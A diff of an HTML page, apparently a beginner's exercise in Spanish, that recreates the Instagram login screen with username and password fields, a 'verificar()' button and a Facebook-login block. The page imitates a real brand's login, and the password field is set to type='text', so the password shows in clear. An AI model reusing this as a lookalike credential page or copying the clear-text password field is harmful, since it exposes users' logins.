@@ -4,23 +4,29 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="stylesheet" href="css/estilos.css">
-    <script></script>
+    <script type"text/javascript" src="JS/funciones.js"></script>
     <title>Instagram</title>
 </head>
 <body>
     <div class="contenedor">
         <div class="mitad izq"></div>
+        <div class="mitad centro"></div>
         <div class="mitad der">
-                <h1>Instagram</h1>
-                <input type="text" id="usuario" placeholder="Usuario">
-                <input type="Constraseña" id="contraseña" placeholder="Constraseña">
-                <button>Iniciar sesion</button>
+                <div class="insta"></div>
+                <br>
+                <form id="formulario">
+                    <input type="text" id="usuario" placeholder="Usuario">
+                    <br><br>
+                    <input type="text" id="contra" placeholder="Contraseña">
+                </form>
+                <button onclick="verificar()">Iniciar sesión</button>
                 <hr><h6>O</h6><hr>
+                <br><br>
                 <div class="contenedorfacebook">
-                    <div id="logo"></div>
-                    <h2>Iniciar sesion con Facebook</h2>
+                    <div class="logo"></div>
                 </div>
-                <a href="">Forgot login or password</a>
+                <br>
+                    <a href="">¿Olvidaste tu constraseña?</a>
            <div></div>
         </div>
     </div>
